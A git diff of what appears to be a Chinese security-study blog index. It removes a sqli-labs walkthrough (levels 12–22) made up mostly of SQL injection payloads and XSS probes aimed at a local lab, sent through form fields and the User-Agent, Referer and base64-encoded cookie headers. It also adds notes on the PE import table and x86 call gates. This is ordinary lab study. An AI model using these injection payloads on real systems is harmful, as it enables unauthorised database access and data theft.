-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
-<p>报错信息</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span>&quot;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p>构造闭合注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;) UNION SELECT DATABASE(),USER() -- sdk </span><br></pre></td></tr></table></figure>
-<p>成功，扔sqlmap</p>
-<hr>
-<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>测试闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
-<p>报错</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span><span class="string">&#x27;) LIMIT 0,1</span></span><br></pre></td></tr></table></figure>
-<p>构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;) UNION SELECT USER(),DATABASE() -- JSDN </span></span><br></pre></td></tr></table></figure>
-<p>界面不再回显信息<br>但是</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../images/flag.jpg&quot;</span>   /&gt;</span></span><br></pre></td></tr></table></figure>
-<p>所以进行盲注</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;) AND LENGTH(DATABASE())=8  -- JSDN </span></span><br></pre></td></tr></table></figure>
-<p>返回是错误，检查原因，是因为passwd并不正确，所以使用</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;) OR LENGTH(DATABASE())=8  -- JSDN </span></span><br></pre></td></tr></table></figure>
-<p>成功</p>
-<hr>
-<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>测试闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
-<p>报错</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">11111</span>&quot; LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p>构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1111</span>&quot; OR LENGTH(DATABASE())=8 -- SJSN </span><br></pre></td></tr></table></figure>
-<p>返回flag.jpg，成功</p>
-<hr>
-<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>测试闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin\<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
-<p>这里不再提示错误的语句只返回slap.jpg</p>
-<p>开始手工fuzzing闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR 1=1 -- sjjs </span></span><br></pre></td></tr></table></figure>
-<p>返回flag.jpg<br>开始构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR LENGTH(DATABASE())=8 -- sjjs </span></span><br></pre></td></tr></table></figure>
-<p>返回flag.jpg，成功</p>
-<hr>
-<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>同样开始fuzzing测试闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;) OR 1=1 -- DDD </span><br></pre></td></tr></table></figure>
-<p>返回flag.jpg</p>
-<p>开始构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot;) OR LENGTH(DATABASE())=8 -- DDD </span><br></pre></td></tr></table></figure>
-<p>返回flag.jpg，成功</p>
-<hr>
-<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这里可以看到是密码更新的一关<br>首先输入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br></pre></td></tr></table></figure>
-<p>返回flag1.jpg是密码更新成功</p>
-<p>输入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27; &amp;passwd=11111&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
-<p>返回slap1.jpg提示<code>BUG OFF YOU SILLY DUMB HACKER</code><br>输入    </p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">11111</span><span class="string">&#x27; &amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
-<p>返回报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;admin&#39;&#39; at line 1</code></p>
-<p>看来是passwd字段存在注入，<br>开始构造报错注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR UPATDEXML(1,CONCAT(0X74,(SELECT DATABASE()),0X74),1) -- DJD</span></span><br></pre></td></tr></table></figure>
-<p>爆出错误</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FUNCTION</span> security.UPATDEXML does <span class="keyword">not</span> exist</span><br></pre></td></tr></table></figure>
-<p>爆出数据库名，成功</p>
-<hr>
-<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>首先输入错误的密码，页面依旧显示ip，输入正确的密码后页面显示User Agent<br>发现直接显示user agent尝试xss</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">(alert(<span class="regexp">/1/</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>弹出页面成功<br>开始测试用户名密码的注入，fuzzing后无结果，既然页面要返回user agent，必定要做处理</p>
-<p>测试user agent字段的闭合方式测试出是单引号</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">80.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">80.0</span> <span class="string">&#x27; OR SLEEP(5) -- SHDH </span></span><br></pre></td></tr></table></figure>
-<p>页面依旧正常并没有延时，查阅资料后发现等如下闭合单引号</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">80.0</span>) Gecko<span class="operator">/</span><span class="number">20100101</span> Firefox<span class="operator">/</span><span class="number">80.0</span> <span class="string">&#x27; OR SLEEP(5) OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br></pre></td></tr></table></figure>
-<p>成功延时，翻阅源代码后发现</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		<span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uagent <span class="operator">=</span> $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">	$IP <span class="operator">=</span> $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line">			mysql_query($<span class="keyword">insert</span>);</span><br></pre></td></tr></table></figure>
-<p>可见这里对于传入的uname和passwd值做了一个过滤，而对于uagent则没有防护，引起http头注入</p>
-<hr>
-<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>根据Less-18的经验很快确定是Referer头的注入，且依旧未对内容进行实体化，造成xss</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Referer: http://192.168.98.133/sqli/Less-19/ <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;XSS&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>根据Less-18的闭合思路</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Referer: http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.98</span><span class="number">.133</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-19</span><span class="operator">/</span> <span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>闭合成功</p>
-<p>构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Referer: http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.98</span><span class="number">.133</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-19</span><span class="operator">/</span> <span class="string">&#x27; OR UPADTAXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>成功爆出<code>FUNCTION security.UPADTAXML does not exist</code><br>成功</p>
-<hr>
-<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>关卡提示是Cookies注入，首先测试一下，发现会跳转<br>慢慢放包发现</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/sqli/Less-20/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.98.133</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.98.133/sqli/Less-20/index.php</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=admin</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
-<p>放过后页面提示</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0</span><br><span class="line">YOUR IP ADDRESS IS : 192.168.98.1</span><br><span class="line">DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE</span><br><span class="line">YOUR COOKIE : uname = admin and expires: Sun 30 Aug 2020 - 15:23:53</span><br><span class="line">Your Login name:admin</span><br><span class="line">Your Password:11111</span><br><span class="line">Your ID:8</span><br></pre></td></tr></table></figure>
-<p>又是一堆没有过滤，也能插xss</p>
-<p>我们把注意力放在cookies上<br>构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span>admin <span class="string">&#x27; or extractvalue(1,concat(user(),0x7e,database())) or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>返回<code>Issue with your mysql: XPATH syntax error: &#39;@localhost~security&#39;</code><br>成功</p>
-<p>接下来试试前一个登录页面是否存在注入，发现突破不了<br>一打开源码，果然，又有过滤。。。。。</p>
-<hr>
-<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>这次果断不测试前面，肯定有过滤直接走后面流程<br>页面中又是熟悉的xss的香味，可惜是x自己<br>看到请求包可以很明显的看到不同</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3D</span><br></pre></td></tr></table></figure>
-<p>通过base64解码可知内容<code>admin</code></p>
-<p>嗯开始构造注入语句</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; OR UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>加密后<br><code>JyBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICcxJz0nMQ==</code><br>爆出错误<br><code>Issue with your mysql: XPATH syntax error: &#39;~security~&#39;</code><br>成功</p>
-<p>这里再对user agent进行注入，发现失败</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br></pre></td></tr></table></figure>
-<p>这里作者并未进行sql操作，只是直接打印</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = base64_decode(<span class="variable">$cookee</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$cookee</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">			<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
-<p>而对于cookee则是进行了查询，且这里的cookee只是简单进行了base64加密，而并未进行过滤操作</p>
-<hr>
-<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>这里依旧是一个cookies的注入<br>首先根据Less-21的payload直接插</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3DJyBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICcxJz0nMQ==</span><br></pre></td></tr></table></figure>
-<p>失败<br>换个闭合方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">&quot; OR UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1) OR &quot;<span class="number">1</span>&quot;=&quot;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">IiBPUiBVUERBVEVYTUwoMSxDT05DQVQoMHg3ZSwoU0VMRUNUIERBVEFCQVNFKCkpLDB4N2UpLDEpIE9SICIxIj0iMQ<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
-<p>爆出<br><code>Issue with your mysql: XPATH syntax error: &#39;~security~&#39;</code><br>嘻嘻，成功</p>
-<hr>
 ]]></content>
       <categories>
         <category>学习笔记</category>
@@ -682,7 +682,7 @@
     <content><![CDATA[<h1 id="0x01练习1"><a href="#0x01练习1" class="headerlink" title="0x01练习1"></a>0x01练习1</h1><p>在中断门通过retf返回,在调用门通过iretd返回</p>
 <a id="more"></a>
 
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> cs_eip[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x48</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">DWORD data;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">InGate1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>+<span class="number">0x08</span>]</span><br><span class="line">		push ebx</span><br><span class="line">		popfd</span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>+<span class="number">0x04</span>]</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x08</span>],ebx</span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>]</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x04</span>],ebx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		pop eax</span><br><span class="line">		retf</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax+<span class="number">0x20</span>]</span><br><span class="line">		mov ecx,[eax+<span class="number">0x24</span>+<span class="number">0x04</span>]</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x04</span>],ebx</span><br><span class="line"></span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>]</span><br><span class="line">		mov [eax+<span class="number">0x20</span>],ebx</span><br><span class="line"></span><br><span class="line">		mov [eax+<span class="number">0x24</span>],ecx</span><br><span class="line"></span><br><span class="line">		popad</span><br><span class="line">		iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="number">32</span></span><br><span class="line">		call fword ptr[cs_eip]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> cs_eip[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x48</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">DWORD data;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">InGate1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line"></span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>+<span class="number">0x08</span>]</span><br><span class="line">		push ebx</span><br><span class="line">		popfd</span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>+<span class="number">0x04</span>]</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x08</span>],ebx</span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>]</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x04</span>],ebx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		pop eax</span><br><span class="line">		retf</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax+<span class="number">0x20</span>]</span><br><span class="line">		mov ecx,[eax+<span class="number">0x24</span>+<span class="number">0x04</span>]</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x04</span>],ebx</span><br><span class="line"></span><br><span class="line">		mov ebx,[eax+<span class="number">0x24</span>]</span><br><span class="line">		mov [eax+<span class="number">0x20</span>],ebx</span><br><span class="line"></span><br><span class="line">		mov [eax+<span class="number">0x24</span>],ecx</span><br><span class="line"></span><br><span class="line">		popad</span><br><span class="line">		iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="number">32</span></span><br><span class="line">		call fword ptr[cs_eip]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
       <tags>
         <tag>笔记</tag>
         <tag>保护模式</tag>
@@ -774,6 +774,215 @@
       </tags>
   </entry>
   <entry>
+    <title>导入表学习笔记</title>
+    <url>/2021/01/27/%E5%AF%BC%E5%85%A5%E8%A1%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="导入表学习笔记"><a href="#导入表学习笔记" class="headerlink" title="导入表学习笔记"></a>导入表学习笔记</h1><hr>
+<h2 id="0x00-导入表概述"><a href="#0x00-导入表概述" class="headerlink" title="0x00 导入表概述"></a>0x00 导入表概述</h2><p>当程序使用非自身文件所写的函数，比如MessageBox的时候，这时候是从外界引了user32.dll里的函数。当程序使用了动态链接库里的函数时，编译和链接后的这些信息都会写入PE结构的导入表里。而我们的程序也是通过导入表来告诉操作系统这些函数该在哪去找。</p>
+<a id="more"></a>
+
+<p>而导入表则是位于IMAGE_DIRECTORY_ENTRY_IMPORT的第2项，而第2项指向的仍是一个数组。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics; <span class="comment">//通常为0</span></span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   ForwarderChain;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
+<p>然后我们来看几个重要点的值</p>
+<ol>
+<li><p><code>DWORD   OriginalFirstThunk;</code>为INT表，是一个RVA指向了一个<code>PIMAGE_THUNK_DATA</code>结构</p>
+<p>当<code>PIMAGE_THUNK_DATA</code>的最高位为1时为一个序号，是一个以序号导出的函数的导出序号        </p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PBYTE  ForwarderString;</span><br><span class="line">        PDWORD Function;</span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        PIMAGE_IMPORT_BY_NAME  AddressOfData;</span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>
+<pre><code>当`PIMAGE_THUNK_DATA`的最高位为0时为一个RVA指针，而里面存的是RVA且指向`_IMAGE_IMPORT_BY_NAME`结构</code></pre>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    BYTE    Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>
+<pre><code>且其中Hint为序号，不一定是导出序号，大部分的编译器置0；而Name则是指向函数名称首字符。</code></pre>
+<ol start="2">
+<li><p><code>DWORD   TimeDateStamp; </code>为时间戳</p>
+<p>当时间戳为0时表示为该dll未绑定</p>
+<p>当时间戳不为0时则该dll已被绑定，且时间戳于dll的时间戳相同（New Bound），如果不同则绑定已过期（Old Bound）</p>
+</li>
+<li><p><code>DWORD   Name;</code>为dll的文件名的地址(RVA)</p>
+</li>
+<li><p><code>DWORD   FirstThunk; </code>IAT表，在文件中值与INT表相同，在内存中载入后则为函数的真实地址(RVA)；如果该dll已绑定，则该值为该dll函数的真实地址</p>
+</li>
+</ol>
+<h2 id="0x01-导入表基本图解"><a href="#0x01-导入表基本图解" class="headerlink" title="0x01 导入表基本图解"></a>0x01 导入表基本图解</h2><p><img src="https://i.loli.net/2021/01/26/Uc8ZDgwiV5ldFWq.png" alt="image-20210126011214938"></p>
+<p><img src="https://i.loli.net/2021/01/26/Jiuf29PLQv8Hyw1.png" alt="image-20210126011353615"></p>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅谈if/switch的&quot;效率革命&quot;</title>
+    <url>/2019/12/06/%E6%B5%85%E8%B0%88switch-if/</url>
+    <content><![CDATA[<p>效率似乎是个或远或近的词，对于许多人来说，在如此快速的今天，似乎不太重视那肉眼不可分的损耗。每个人都有自己的”傲慢与偏见”，而就在这里让我们回过头来看一看某些被我们忽略的一些小细节。</p>
+<p>流程对于我们日常生活来说并不陌生，或许一条道走到黑的日子并不是丰富多彩。这时条件分支便给我们提供了更加灵活的可能。</p>
+<a id="more"></a>
+<p>便会有类似于这种的if语句</p>
